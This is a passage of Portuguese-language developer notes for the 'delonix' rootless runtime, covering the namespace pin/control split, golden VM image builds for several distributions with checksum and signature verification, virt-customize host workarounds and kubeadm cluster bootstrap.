  namespace "público" — alcançável de dentro de qualquer namespace, mas não alcança para dentro
  delas); (2) se o PIN morrer, as VMs não são recuperadas (containers e pods são, por reinício).

## Pin/controlo: o holder deixou de ser ponto único de falha (v0.42.0)

Até à v0.41.0 UM processo segurava os namespaces **e** corria o plano de controlo. Reiniciar o
plano de controlo — crash, `kill`, upgrade in-place — destruía a netns e desligava
permanentemente todos os workloads do nó. A v0.41.0 tratou o sintoma (recuperar por reinício);
esta trata a causa.

**A medição que inverteu a premissa** (feita antes de escrever código, com uma VM CH viva): matar
o holder deixa **tudo** de pé — o processo da VM, a netns (mesmo inode), `delonix0`, o `tap` da
VM, o `tap0` do slirp com IP e rota, o ruleset `nft` com a chain de isolamento, e o próprio
`slirp4netns`. E entra-se nessa netns órfã **sem privilégio**, por um membro vivo
(`nsenter -t <pid> -U -m -n`). O que matava a rede era o `ensure_up` seguinte **deitar fora uma
netns funcional** para construir outra. Corrige de passagem uma afirmação larga demais que estava
registada: o impossível em rootless é `ip netns attach` a partir do host (CAP_SYS_ADMIN sobre o
userns morto); **entrar** a partir de um membro vivo é outra operação e funciona.

- **`delonix netns pin`** faz o `unshare` e adormece — sem sockets, sem threads, sem estado.
  **`delonix netns control`** corre lá dentro por `nsenter` e é reiniciável (socket de controlo,
  DNS, RA, DHCP por bridge). `ensure_up` tem três casos: pin+controlo vivos (nada); pin vivo e
  controlo ausente (**repõe só o controlo**); pin morto (reconstrução + recuperação por reinício).
- **O pidfile do pin mantém o nome histórico de propósito** (`holder.pid`): é o pid que todos os
  `nsenter -t <holder>` da árvore visam (`join_argv`/`infra_join_argv`/`disable_ipv6_live`) e
  agora é o que NUNCA muda. Renomeá-lo era mexer em todos os consumidores para dizer o mesmo.
- **Efeito lateral valioso**: o pin não tem comportamento versionado, logo **pin antigo +
  controlo novo é seguro por construção** — a armadilha do upgrade in-place da v0.34.2 desaparece
  do caminho normal (a detecção do socket legado fica, para um holder pré-split).
- **O reattach NÃO repete os passos destrutivos** (cada um verificado, não assumido):
  `mount -t tmpfs none /run` montaria um SEGUNDO tmpfs por cima, escondendo `/run/netns` — a netns
  nomeada de cada pod e de cada container `--net <custom>` do nó; `ip link add`/`ip addr add`
  devolvem `File exists` e abortariam o arranque; reaplicar o ruleset base reacrescenta as regras
  de dispatch do `fwcont` (o ruleset FUNDE-SE na tabela — não tem `flush`, e é por isso que as
  firewalls dos containers sobrevivem de todo). No reattach reconstrói-se só o que é **local ao
  processo**: os servidores de DHCP, que são threads.

**Três bugs que só a validação ao vivo revelou** — os três da mesma família («X não é Y»):

1. **`/sys/class/net` não reflecte a netns do processo.** Reporta a netns de quem **montou** o
   sysfs, e o pin nunca remonta `/sys`: de dentro do controlo aquele directório é o do HOST. A
   sonda dizia «netns vazia» para uma que tinha bridge, e o controlo morria em `ip link add
   delonix0: File exists`. Passou a perguntar por netlink (`link_exists`, `ip link show`).
2. **`capture()` devolve `Ok` mesmo quando o comando falha** — não olha para o exit status de
   todo. A 2ª versão da sonda usava `.is_ok()` e era SEMPRE verdadeira: numa netns virgem o
   controlo tomava o reattach, não construía nada, e o `net netns up` anunciava `ingress UP` sobre
   uma netns sem bridge. Lê-se agora a SAÍDA. **Nota para quem mexer aqui**: `capture` é lenient
   por desenho e tem muitos chamadores — verificar sempre o que ela devolve, nunca o `Result`.
3. **Um ficheiro de socket sobrevive ao processo que o criou.** `wait_for_control_sock` era
   `path.exists()` — 3.ª aparição do mesmo erro nesta base (depois do `status()` por pidfile e do
   `container.userns`). Só passou a doer quando o split deu ao controlo forma de morrer sozinho:
   com o ficheiro órfão a passar, o `ensure_up` devolvia `ingress UP` sobre um nó SEM plano de
   controlo — dataplane bem (é o objectivo), mas sem attach/publish/DNS e sem um aviso. Agora faz
   um `connect` real; a função que ficou sem chamadores foi APAGADA, não deixada à espera.

**Validado ao vivo** com pod + container em rede custom + VM CH ao mesmo tempo: `kill -9` no
controlo → pin `77461→77461`, controlo `77464→77722`, e **VM/pod/container com o PID inalterado**,
rede intacta, isolamento preservado, trabalho novo aceite de imediato. Matar o PIN continua a cair
na reconstrução completa. Cenário de caos `control_restart`, que compara **PIDs** e não só
conectividade — uma recuperação por reinício também deixaria a rede a funcionar e seria
indistinguível de outra forma. Arnês: 17/17.

## Imagem VM dourada (`delonix image --vm`)

`delonix image --vm ls|pull|push|build` gere imagens VM à parte das imagens de container
(`ImageStore`) — um `.qcow2` solto + `.json` de metadados por imagem, em `<root>/vm-images/`
(`crates/delonix-runtime-bin/src/cmd/vmimage.rs`, `VmImageStore`). Prepara o terreno para
`delonix cluster kubeadm` (secção "Cluster kubeadm" abaixo — já implementado): a imagem já vem
com `kubeadm`/`kubelet`/`kubectl` e o `delonix-cri` a correr como serviço systemd — **arrancar um
nó não faz nenhuma instalação**, só `kubeadm init`/`kubeadm join`.

- **`build`**: descarrega a cloud image Ubuntu (`cloud-images.ubuntu.com/releases/<release>/
  release/`, cache em `<root>/vm-images/_base/`, valida contra `SHA256SUMS` — nunca aceita um
  download sem verificar), achata-a (`qemu-img convert`, sem depender de um backing-file local
  no artefacto final), e corre `virt-customize` com uma lista de passos construída em Rust por
  `k8s_customization_steps()` — **isto é o "100% parametrizado"**: `--extra-package`/
  `--extra-run` estendem sem tocar no código. Instala o repositório `pkgs.k8s.io` +
  `kubeadm`/`kubelet`/`kubectl`, desliga swap, carrega `overlay`/`br_netfilter` + sysctls
  exigidos pelo kubelet/CNI, injecta o binário `delonix-cri` (ver abaixo) + a unit systemd
  (`dist/delonix-cri.service`, `systemctl enable`), e cria a conta `delonix` em `sudo` com
  `NOPASSWD` — **sem password nenhuma, nem ela nem o root** (ver «A imagem base não leva
  credenciais» abaixo; esta linha dizia `root`/senha `delonix` e deixou de ser verdade).
  cloud-init fica ACTIVO na
  imagem (o build só corre uma vez; o cloud-init do primeiro-boot de CADA VM continua a aplicar
  hostname/SSH-keys — ver `delonix vm create` abaixo). Configura também, em `/etc/bash.bashrc`
  (bash interactivo login E não-login — consola série e SSH), o **autocomplete + alias `k`**
  recomendado pela doc do Kubernetes: `source <(kubectl completion bash)` / `alias k=kubectl` /
  `complete -o default -F __start_kubectl k` / `source <(kubeadm completion bash)` (+ `crictl`),
  cada bloco guardado por `command -v` (inerte se faltar a ferramenta). Fica em
  `common_customization_steps` (partilhado pelos builds online E offline); só toma efeito na
  próxima build/publicação da golden (`vm-image.yml`).
- **Tamanho do artefacto (medido, golden 24.04: 2.38 GiB → 677 MiB, −72%)** — três passos, todos
  no fim do `build`, cada um com uma razão concreta:
  1. **`apt-get clean` + `rm -rf /var/lib/apt/lists/*`** (último `CustomizeOp`, DEPOIS do
     `--extra-run` do utilizador, que pode instalar mais pacotes). Media na golden: `/var/cache/apt`
     ~181 MiB + `/var/lib/apt/lists` ~186 MiB = **~367 MiB de lixo** que enchiam a raiz a **92%**
     (179 MiB livres — perigoso para um nó k8s: o kubelet despeja perto do limite). Depois: 77%,
     546 MiB livres. Fica em `k8s_customization_steps` e **não** em `k8s_recipes` — aquele catálogo
     é PARTILHADO com `cluster apply`, que prepara hosts VIVOS; limpar cache é preocupação do
     ARTEFACTO, não da preparação de um host.
  2. **`virt-sparsify --in-place`** — zera os blocos que a limpeza libertou (sem isto continuam a
     ocupar no qcow2). Best-effort: se falhar, o build segue (só perde tamanho).
  3. **`qemu-img convert -c -o compression_type=zstd`** — a cloud image da Ubuntu **vem comprimida**
     e o `convert` inicial (sem `-c`) descomprime-a; sem este passo o artefacto fica ~4x maior que
     a base (593 MiB → 2.38 GiB). **zstd e não o zlib por omissão**: comprime 5x mais rápido
     (10s vs 53s), fica menor (868 vs 894 MiB no mesmo input), e sobretudo **descomprime** muito
     mais rápido — importa porque a golden é o **backing file read-only** das VMs
     (`delonix_vm::create` faz um overlay qcow2 por VM), logo cada leitura do SO base passa pelo
     descompressor. Escapatória: `--no-compress`. Custo total: ~12s de build.
- **`--offline` (PREFERIR SEMPRE; validado 2026-07-17, build em 1m18s)** — obtém os `.deb` do k8s
  no **HOST** e corre o `virt-customize` com **`--no-network`**. O appliance nunca precisa de
  DHCP/DNS, o que **dispensa os workarounds de host** (passt/dhclient) que o caminho online
  exige — ver "Bloqueio de execução conhecido" abaixo. Validado com o `passt` ATIVO, sem tocar
  no host.
  - **Cadeia de confiança: a MESMA do apt, feita no host em vez do guest** — `InRelease`
    (clearsigned, verificado com `gpgv` contra a `Release.key` do repo, keyring TEMPORÁRIO —
    nunca toca no do utilizador) → SHA256 do índice `Packages` (declarado no InRelease assinado)
    → SHA256 de cada `.deb` (declarado no `Packages` autenticado). **Falha FECHADO** em qualquer
    passo — mesmo princípio do achado CRÍTICO nº3 da auditoria (`pull_oci_artifact` sem digest).
  - **Porque `dpkg -i` chega** (medido, não suposto): o fecho são só **4 `.deb` do repo k8s**
    (`kubeadm`/`kubectl`/`kubelet` + `kubernetes-cni`); as restantes deps do kubelet
    (`iptables`/`mount`/`util-linux`/`libc6`) **já vêm na cloud image**. Se alguma faltar, o
    `dpkg` falha ALTO — nunca deixa o guest meio-instalado.
  - **Armadilha (custou um build)**: `kubernetes-cni` tem versionamento PRÓPRIO (1.7.x), não
    segue o do k8s — o filtro `--k8s-version 1.34` só se aplica aos componentes core
    (`parse_packages_index`, parâmetro `versioned`). Há teste de regressão.
  - As receitas sem rede (swap/módulos/sysctls) são partilhadas tal e qual com o caminho online
    (`k8s_recipes::k8s_config_recipes`) — os dois modos **não divergem**. `k8s_host_recipes()` =
    as 2 de rede + estas, para o `cluster apply` (hosts vivos) continuar a ver o catálogo todo.
  - Equivalência com o online **provada**: mesmos pacotes e mesmo estado de hold —
    `kubeadm`/`kubectl`/`kubelet` `hi` 1.34.9-1.1, `kubernetes-cni` `ii` 1.7.1-1.1.
- **Pré-semear as imagens do `kubeadm` (v0.15.0)** — bug report real (host kaeso-sys-01): um
  `kubeadm init` REAL redescarregava sempre TODAS as imagens core (apiserver/controller-manager/
  scheduler/etcd/coredns/pause) do zero, em CADA VM criada — lento o suficiente para estourar o
  próprio deadline interno do rate-limiter do kubeadm e fazer o `wait-control-plane` falhar a
  meio. **Causa-raiz de fundo**: `delonix_image::registry::pull_from_registry_with_creds`
  descarregava sempre cada blob da rede, mesmo quando o conteúdo exacto já estava no CAS local —
  **corrigido** com um `Cas::has` (já existia, nunca era chamado) antes de cada `GET` de blob;
  sem isto, pré-semear a imagem dourada não adiantava nada (o `delonix-cri` ia redescarregar tudo
  na mesma). Com o fix, `--offline build` passou a: extrair o `kubeadm` do `.deb` já
  descarregado/verificado no HOST (`dpkg-deb -x`, sem instalar), correr `kubeadm config images
  list --kubernetes-version=vX.Y.Z` (sem rede — é uma tabela interna estática do binário; provado
  ao vivo), descarregar cada imagem no HOST através do MESMO `pull_from_registry_with_creds` para
  um `ImageStore` de trabalho, e injectar as suas 4 subpastas (`images`/`layers`/`containers`/
  `blobs`) em `/var/lib/delonix` do convidado via `virt-customize --copy-in` — o mesmo caminho que
  `delonix-cri` já lê em runtime. Melhor esforço em toda a cadeia: uma falha (imagem em falta,
  `dpkg-deb` ausente, etc.) só avisa e segue sem imagens pré-semeadas, nunca chumba o build
  inteiro — um arranque mais lento é sempre melhor que um build partido. **Só no modo
  `--offline`** (o caminho online já corre `apt-get`/pull dentro do convidado, sem o mesmo
  encaixe host-primeiro). Validado ao vivo: `kubeadm config images list` a partir de um `kubeadm`
  extraído (sem instalar) devolveu as 7 imagens reais da v1.34; um `pull_from_registry_with_creds`
  real contra `registry.k8s.io/pause:3.10.1` confirmou o layout do `ImageStore` resultante
  (`images/layers/containers/blobs`) bate exactamente com o que o `--copy-in` espera.
- **`--no-k8s` (v0.16.0) — golden SEM Kubernetes, só `delonix` + rootless pronto a usar.** Fase 1
  de 3 (pedido: Ubuntu 26.04 [já funciona hoje, zero código — `--ubuntu-release 26.04`], Ubuntu
  24.04 sem k8s [este], Debian, Rocky — sequenciamento incremental escolhido explicitamente pelo
  utilizador). `k8s_version: None` **não** era "sem k8s": `k8s_repo_version` cai sempre em
  `stable:/v1.31` e instalava kubeadm/kubelet/kubectl na mesma — não havia forma de desligar.
  `--no-k8s` é um caminho novo (`rootless_customization_steps`), mutuamente exclusivo com
  `--k8s-version`/`--offline`/`--cri-bin` (rejeitado com erro claro, nunca ignorado em silêncio):
  instala os mesmos pacotes rootless que o `install.sh` exige (`slirp4netns`/`uidmap`/`nftables`/
  `iproute2`/`conntrack`), injecta o binário `delonix` (não `delonix-cri` — um shim de CRI para o
  kubelet não serve para nada sem kubelet; sem unidade systemd, o motor é invocado por CLI, não é
  um serviço), configura o intervalo subuid/subgid da conta `delonix` (mesma lógica do
  `ensure_subid` do `install.sh` — sem isto o userns rootless só mapeia 1 uid) e escreve o perfil
  AppArmor `unconfined+userns` (`install.sh:370-381`, necessário em hosts Ubuntu 23.10+ com
  `kernel.apparmor_restrict_unprivileged_userns=1` — sem ele o `unshare(CLONE_NEWUSER)` falha logo
  no arranque). A criação de conta/sudoers/bash-completion/limpeza de apt/reset de machine-id
  continua **partilhada** com o caminho k8s (`shared_account_steps`, extraído de
  `common_customization_steps` sem alterar o output do caminho k8s — só o CRI ficou à parte em
  `install_cri_steps`). Publica em `ghcr.io/angolardevops/delonix-vm-base` (repositório novo,
  tags `ubuntu-24.04`/futuramente `debian-12`/`rocky-9` — sem wiring de omissão em `Pull`/
  `LsRemote` nesta fase, o chamador passa sempre a fonte explícita — **fechado no v0.23.0**, ver
  abaixo). `vm-image.yml` ganhou o input `no_k8s` (boolean) que troca o passo de build/tag/
  repositório de destino. **Por fazer (deliberadamente fora desta fase)**: Rocky (dnf — família de
  gestor de pacotes diferente, o maior salto; feito no v0.18.0), `--offline` para `--no-k8s` (a
  verificação de `.deb` no host é específica do `pkgs.k8s.io`).
- **`--distro debian` (v0.17.0) — Fase 2 de 3.** `download_ubuntu_base` generalizou-se em
  `download_ubuntu_base`/`download_debian_base` por trás de um novo enum `Distro { Ubuntu,
  Debian }` (`--distro`, `clap::ValueEnum`, omissão `ubuntu` — zero mudança de comportamento para
  quem não usa a flag nova). Confirmado ao vivo (não suposto) antes de escrever código: o cloud
  image Debian vive em `cloud.debian.org/images/cloud/<codinome>/latest/debian-<major>-
  genericcloud-amd64.qcow2` (`genericcloud`, não `generic` — kernel só-virtio, cloud-init
  mantido, mais pequeno; o nome do ficheiro usa o NÚMERO MAJOR, o directório usa o CODINOME, sem
  alias numérico — daí `debian_major_version` com uma whitelist explícita
  bullseye/bookworm/trixie, erro claro para o resto) e **publica só `SHA512SUMS` — não
  `SHA256SUMS` de todo** (confirmado com `curl -I`; mesmo formato `<hash>  <ficheiro>`, algoritmo
  diferente) — `hex_sha512_file` novo (mesmo `sha2` já na árvore, zero dependência nova), testado
  contra o vector oficial NIST de `SHA-512("abc")`. O resto do pipeline (`rootless_customization_
  steps`/`shared_account_steps`/`k8s_host_recipes`) já era 100% distro-agnóstico — confirmado
  antes de escrever código: o repositório `pkgs.k8s.io` usa formato de repo "flat" (sem
  codinome/suite no URL), a conta `sudo`/`/etc/bash.bashrc` são convenções idênticas em
  Debian/Ubuntu (mesma linhagem de empacotamento) — por isso o `--distro debian` já funciona com
  E sem `--no-k8s`, sem código extra nenhum para o k8s em si. `VmImage` ganhou `distro:
  Option<String>` (`#[serde(default)]`, metadados antigos continuam válidos); `ubuntu_release`
  manteve o NOME do campo (romper renomeá-lo quebraria `.json` já em disco, que não tem
  `#[serde(default)]` nesse campo) mas agora guarda o identificador de release de QUALQUER distro.
  `vm-image.yml` ganhou `distro`/`debian_release` (só para builds `--no-k8s`, mesmo escopo do
  `no_k8s` da fase anterior). **Limitação conhecida**: o download real do qcow2 Debian (~300-600
  MiB) não foi validado de ponta a ponta neste sandbox — a ligação de saída daqui até
  `cloud.debian.org` mostrou-se muito lenta (confirmado independentemente com `curl` simples, não
  é bug do código); a verificação SHA512 em si está coberta por teste unitário com vector
  conhecido, e o URL/formato do `SHA512SUMS` foi confirmado ao vivo com `curl -I`/`curl` de texto
  (ficheiros pequenos). Uma build `--offline` para Debian não está implementada (mesma razão do
  `--no-k8s`: `download_k8s_debs` já é distro-agnóstico do lado do host, mas não foi testada nesta
  combinação) — só o caminho online e `--no-k8s` foram cobertos nesta fase.
- **`--distro rocky` (v0.18.0) — Fase 3 de 3, a última (dnf/RPM, a família de gestor de pacotes
  mais distante de tudo o resto do código).** Escopo **deliberadamente só `--no-k8s`** — o pedido
  original já enquadrava o Rocky como variante para tenants sem Kubernetes, e `k8s_recipes`
  (repositório `pkgs.k8s.io`, `dpkg -i`/`apt-mark hold`) é apt-only; o RPM equivalente do
  `pkgs.k8s.io` tem URL/GPG diferentes e fica fora desta fase. `cmd_build` rejeita
  `--distro rocky` sem `--no-k8s` com erro claro, em vez de tentar correr `apt-get`/`dpkg` num
  guest dnf.
  - **Cloud image**: confirmado ao vivo (não suposto) contra `dl.rockylinux.org` antes de
    escrever código — `pub/rocky/<major>/images/x86_64/Rocky-<major>-GenericCloud.latest.
    x86_64.qcow2` (árvore diferente da do Debian — sem segmento `images/cloud/`). O `<major>` é
    literal (`8`/`9`/`10`, sem tradução de codinome como o Debian) — `valid_rocky_release`
    valida contra essa whitelist só por UX (erro rápido, claro, antes de qualquer rede); ao
    contrário do `debian_major_version`, não é uma fronteira de segurança (um valor desconhecido
    já falhava em segurança com um 404 do `stream_download`).
  - **Checksum: uma TERCEIRA forma, diferente das outras duas.** Rocky publica um `.CHECKSUM`
    PER-FILE (não uma `SUMS` por directório) no formato BSD `SHA256 (<ficheiro>) = <hash>` —
    confirmado ao vivo, diferente do `<hash>  <ficheiro>` GNU que Ubuntu/Debian usam.
    `parse_bsd_checksum` novo (testado com a linha real capturada ao vivo); SHA256 (não SHA512
    como o Debian), por isso reutiliza `hex_sha256_file` sem alterações.
  - **Nomes de pacote RPM confirmados ao vivo** (não assumidos) contra os próprios listagens do
    repositório Rocky 9 antes de escrever código: `shadow-utils` (não `uidmap`), `iproute` (não
    `iproute2`), `conntrack-tools` (não `conntrack`) — todos em BaseOS/AppStream, **sem EPEL**.
    `nftables`/`slirp4netns` partilham o nome entre as duas famílias.
  - **`shared_account_steps` ganhou um parâmetro `distro`** (branch em 3 pontos, todos
    confirmados ao vivo): o grupo sudo-equivalente é `wheel` no Rocky (não `sudo`, que nem
    existe lá); o ficheiro bash interactivo do sistema é `/etc/bashrc` (não `/etc/bash.bashrc`,
    convenção Debian/Ubuntu); a limpeza de cache de pacotes é `dnf clean all` em vez de
    `apt-get clean && rm -rf /var/lib/apt/lists/*`. Debian/Ubuntu mantêm exactamente o output de
    antes (teste de regressão dedicado).
  - **BUG apanhado ANTES de publicar, não em produção**: o passo do perfil AppArmor
    (`printf ... > /etc/apparmor.d/delonix && (apparmor_parser ... || true)`) só guarda a
    chamada ao `apparmor_parser` com `|| true` — a ESCRITA do ficheiro não tem guarda nenhuma.
    O Rocky/RHEL não tem `/etc/apparmor.d/` (usa SELinux, não AppArmor) — correr este passo lá
    faria o redirect falhar, o `&&` curto-circuitar, e o `RunCommand` inteiro (logo o
    `virt-customize`, logo o build inteiro) falhar. **Corrigido pela raiz**: o passo passou a só
    correr quando `distro == Distro::Ubuntu` — não é só um workaround para o Rocky, é também mais
    correcto para o Debian (o sysctl `kernel.apparmor_restrict_unprivileged_userns` que este
    perfil existe para contornar é uma patch de kernel exclusiva do Ubuntu 23.10+, nunca existiu
    no Debian; ficava lá antes só por não ter sido revisto, inofensivo porque o Debian tem
    `/etc/apparmor.d/`, mas incorrecto na mesma). Teste de regressão dedicado
    (`rootless_steps_rocky_nunca_escreve_perfil_apparmor`) prova que o Rocky nunca vê o comando.
  - `vm-image.yml` ganhou `rocky_release`, mesmo escopo dos inputs de distro anteriores.
    **Limitação conhecida**: tal como o Debian, o download real do `.qcow2` Rocky não foi
    validado de ponta a ponta neste sandbox (mesma ligação de saída lenta) — verificação SHA256
    coberta por teste unitário com a linha real capturada ao vivo, URL/redirect confirmados com
    `curl -I` contra as 3 versões major.
  - **`fedora` no `vm-image.yml` (2026-08-12)** — a distro existia no motor desde o ciclo do
    `--distro fedora` e **nunca chegou ao workflow**, por isso a imagem Fedora não era publicável
    de todo. `fedora_release` traz release E build (`42-1.1`, que o nome do artefacto do
    fabricante carrega e a versão não determina), mas a **tag OCI leva só o major**
    (`fedora-42`): `fedora-42-1.1` não diz nada a mais a quem a lê e desalinhava-se das irmãs.
    O job ganhou também o passo do **passt actual + `XDG_RUNTIME_DIR`** — sem ele NENHUMA
    variante `--no-k8s` constrói no runner, porque essas instalam pacotes dentro do appliance e
    o passt do Ubuntu 24.04 é o mesmo que falha aqui (ver a secção do Fedora, mais abaixo).
    **NÃO validado em CI por mim**: disparar o workflow publica imagens e é decisão do dono.
- **`push`/`pull`**: publicam/obtêm a imagem como artefacto OCI de blob único (config vazio + 1
  layer, padrão ORAS/Helm) via `delonix_image::registry::{push_oci_artifact,pull_oci_artifact}`
  (`crates/delonix-image/src/registry.rs`) — generaliza o `Client`/auth/upload já usado por
  `push_to_registry` (imagens de container), sem duplicar a lógica. **PUBLICADA E VALIDADA
  (2026-07-20) via CI** — `ghcr.io/angolardevops/delonix-vm-k8s:1.34` (678.8 MiB, golden
  optimizada), PÚBLICA, com `delonix vm pull` (sem argumento) a descarregá-la de ponta a ponta.
  **`:1.35` publicada a par (2026-07-23)**, mesmo workflow/repositório — as duas tags coexistem
  (`ghcr.io/angolardevops/delonix-vm-k8s:1.34` e `:1.35`).
  O caminho oficial de publicação é o workflow `.github/workflows/vm-image.yml` (disparo manual,
  `workflow_dispatch`, input `k8s_version`): constrói a golden com o binário do próprio commit
  (`image --vm build --offline`) e publica no ghcr. **Lições da publicação real** (a nota anterior
  dizia "publicada em 2026-07-17" mas o package NÃO existia — nunca chegou ao ghcr): (1) o
  **`virt-customize` FUNCIONA em CI** — o bloqueio de `libguestfs` era só do sandbox local, um
  runner `ubuntu-24.04` limpo constrói a golden sem os workarounds; (2) o push do PRIMEIRO package
  de um nome novo no namespace de um **user** (não org) EXIGE um **PAT classic com
  `write:packages`** (secret `GHCR_TOKEN`) — o `GITHUB_TOKEN` do workflow dá **403 Forbidden** mesmo
  com "Workflow permissions: Read and write", porque não pode CRIAR packages novos de user; (3) o
  primeiro push cria o package **privado** — tornar público é um passo manual na UI depois (tags
  seguintes do mesmo package herdam a visibilidade). **Gap conhecido**: o `pull` NÃO recupera os
  metadados (`ubuntu_release`/`k8s_version` ficam `null` — o artefacto OCI só carrega o blob
  qcow2), por isso um `image vm ls` de uma imagem puxada mostra `-` nessas colunas.
- **`ls-remote`** (v0.11.0) — `delonix vm ls-remote` / `image vm ls-remote` / `image --vm
  ls-remote`, sem argumento lista as tags do repositório OCI oficial (`GET
  /v2/<repo>/tags/list`), com argumento qualquer outro repositório — descobre que versões (k8s)
  estão publicadas ANTES de um `pull`, sem tocar em nada local. Reutiliza inteiramente o `Client`/
  auth de `pull`/`push` (`delonix_image::registry::list_remote_tags`, mesmo fluxo 401→token→retry).
  Os três pontos de entrada convergem em `VmImageCmd::LsRemote`, o mesmo padrão triplo que o
  `pull` já seguia. Só a 1.ª página do registo (sem paginação por `Link`) — irrelevante para o
  punhado de tags de uma golden. Validado ao vivo: mostra `1.34` e `1.35` reais no ghcr.io.
- **Bloqueios de host do `virt-customize` — DESAPARECEM com `--offline`** (diagnosticados a
  fundo em 2026-07-17; só afectam o caminho ONLINE, que precisa de DHCP/DNS no appliance):
  1. **Appliance sem cliente DHCP** → `apt-get install` falha com "Could not resolve host".
     Causa-raiz: o `supermin.d/packages` pede `isc-dhcp-client`, mas o supermin só COPIA do host
     e o pacote não estava instalado; o init do appliance tenta `dhclient` e só cai em `dhcpcd`
     como fallback — que também não está nos `hostfiles`. Fix: `sudo apt install isc-dhcp-client`
     (é o que o supermin espera; não é revertido por updates, ao contrário de editar o
     `hostfiles`, que pertence ao pacote `libguestfs0t64`).
  2. **`passt` não dá lease** → o `dhclient` pendura 300s e o build segue SEM rede. Duas camadas:
     (a) o AppArmor (`/etc/apparmor.d/usr.bin.passt`) nega criar socket/PID em
     `/run/user/1000/libguestfs*/` — confirmado por `dmesg | grep 'apparmor.*DENIED.*passt'`; o
     perfil só permite `owner /tmp/**` e `owner @{HOME}/**`, logo
     `XDG_RUNTIME_DIR=$HOME/.cache/libguestfs-run` contorna-o SEM tocar no host. (b) Mesmo assim
     o passt nunca atribui lease (o libguestfs corre-o com `--address 169.254.2.15`), pelo que
     ainda é preciso tirá-lo do PATH (`sudo mv /usr/bin/passt /usr/bin/passt.off`, com `trap`
     para restaurar SEMPRE) → o libguestfs cai no slirp do qemu, que funciona.
  **Conclusão: usar `--offline` e nada disto é preciso.** O `/usr/lib/guestfs` (symlink para
  `/usr/lib/x86_64-linux-gnu/guestfs`, por faltar `libguestfs-common`) continua a ser preciso
  nesta máquina, nos dois modos.

`delonix vm create` ganhou `--hostname`/`--ssh-key <chave-ou-@ficheiro>`/`--user-data <ficheiro>`
— sem `--seed` explícito, gera um ISO NoCloud (`cloud-localds`) por-instância se qualquer um
destes for dado (função pura `build_user_data`, testável sem `cloud-localds` real). Não confundir
com o `build` acima: aquele corre uma vez por IMAGEM (golden), isto corre uma vez por VM.

**`kind: Vm` — paridade total com o CLI + réplica completa do XML libvirt.** A `VmSpec`
(`cmd/vm.rs`) ganhou (1) o **cloud-init declarativo** `hostname`/`sshKeys`/`userData` que só o
CLI tinha; e (2) — CORRIGINDO um bug latente — o `apply` do manifesto passou a gerar **sempre** o
seed (como o CLI), não só quando há volumes: um `kind: Vm` sem volumes ficava sem datasource →
cloud-init saltava a fase de rede → VM sem IP. Além disso, para expressar no manifesto tudo o que
se faz à mão no XML do libvirt, abordagem **"ambos"**: campos **tipados** (`machine`, `cpuModel`
+ `cpuTopology`, `bootOrder`, `tpm`, `video`, `extraDisks` com target dev auto, `extraNics`
network/bridge/user) renderizados no `delonix_vm::libvirt_domain_xml` (função pura, testada), +
dois **escape-hatches de XML cru**: `libvirtXmlOverlay` (fragmentos `<device>` antes de
`</devices>`) e `libvirtXml` (override TOTAL do `<domain>`, verbatim — o seclabel rootless
continua injetado no boot). Os dois hatches são **UNVALIDATED** — só para manifestos confiáveis
(um fragmento pode nomear caminhos/dispositivos arbitrários do host; alinhado com o risco
"manifesto não-confiável" da auditoria E2E). `VmConfig` deriva `Default` (os literais usam
`..Default::default()`); exemplo completo em `examples/vm.yaml`.

**Consola (`vm console`) volta ao shell do host.** A golden faz autologin no ttyS0 → dentro da
consola `exit`/`logout` só re-disparam o getty (loop). O `cmd_console` imprime agora um aviso
claro (i18n) — *voltar ao host: Ctrl+]* — e corre `virsh console` como FILHO (spawn+wait, não
`exec`) para confirmar "De volta ao host" à saída, nos dois backends. E `vm create` mostra
**progresso por etapa** (`CreateStage` emitido pelo motor via `create_with`; texto/i18n no bin) em
stderr + bloco "Próximos passos", com o output cru de `qemu-img`/`virsh` capturado (`run_quiet`);
stdout continua a ser só o nome da VM (scriptável).

`delonix-cri` (`crates/delonix-cri`) ganhou o seu primeiro `[[bin]]` (`src/bin/delonix-cri.rs`)
— antes só existia como library, chamado por ninguém no workspace. Corre `serve_blocking` num
socket unix (`$DELONIX_CRI_ADDR`, default `/run/delonix-cri.sock`) — é o endpoint que o kubelet
fala via `--container-runtime-endpoint`, substituindo containerd/CRI-O.

## Cluster kubeadm (`delonix cluster apply`)

`delonix cluster apply [-f cloud.yaml]` (`kind: Cluster`) — bootstrap `kubeadm` idempotente sobre
SSH em hosts JÁ VIVOS e alcançáveis (não cria VMs — isso é `delonix vm create`, acima). Módulos:
`cmd/remote.rs` (shell-out a `ssh`/`scp` do sistema, `sudo -n` para os comandos remotos — o
utilizador SSH tem de já ter sudo NOPASSWD), `cmd/k8s_recipes.rs` (catálogo PARTILHADO com
`vmimage::build` — repositório `pkgs.k8s.io`/pacotes/swap/módulos/sysctls — para a imagem
dourada e um host preparado por `cluster apply` ficarem exactamente iguais), `cmd/cluster.rs`
(orquestração: prepara todos os hosts → `kubeadm init` no 1.º control-plane → `kubeadm join` dos
restantes control-planes → `kubeadm join` dos workers → traz o kubeconfig para
`<root>/clusters/<nome>-kubeconfig.yaml`, e copia para `~/.kube/config` se ainda não existir).

**Idempotência sem-estado** (pedido explícito, "parecido ao Terraform mas sem ficheiro de
estado"): cada passo de `k8s_recipes` tem um `check` (comando shell, êxito = já satisfeito) e um
`apply`; `kubeadm init`/`join` verificam `/etc/kubernetes/admin.conf`/`kubelet.conf` no host antes
de agir. Nunca dessincroniza de um `.tfstate` porque não há nenhum.

**Simplificações da v1** (pedido era "hosts arbitrários", escopo já grande sem estas):
- **Etcd externo dedicado (v0.24.0)** — `etcd.mode: "external"` + `etcd.hosts` (manifesto) ou
  `cluster kubeadm --etcd-cluster <N>` (auto-provisiona N VMs extra, mesmo `create_and_wait` das
  outras roles). Delonix gera a sua PRÓPRIA CA + um leaf por membro (reutilizado para TLS de peer
  E client/server — reduz a superfície de PKI de um subsistema novo) + um leaf
  `apiserver-etcd-client`, instala+arranca o `etcd` real (binário oficial `etcd-io/etcd`,
  descarregado e verificado por `SHA256SUMS`, nunca por apt — a versão não é da nossa
  responsabilidade) em TODOS os membros em paralelo (`std::thread::scope` — o bootstrap estático
  precisa de todos os membros iniciais alcançáveis em conjunto, não só mais rápido), espera o
  quórum ficar saudável, e só depois corre `kubeadm init`. Como o `kubeadm init` de flags simples
  não consegue exprimir `ClusterConfiguration.etcd.external`, o caminho externo passa a gerar um
  `--config` YAML (`cmd/kubeadm_config.rs`, `serde_yaml`) — o caminho `stacked` (default) fica
  byte-a-byte inalterado. Quórum: `validate()` exige `etcd.hosts` não vazio e um número ÍMPAR
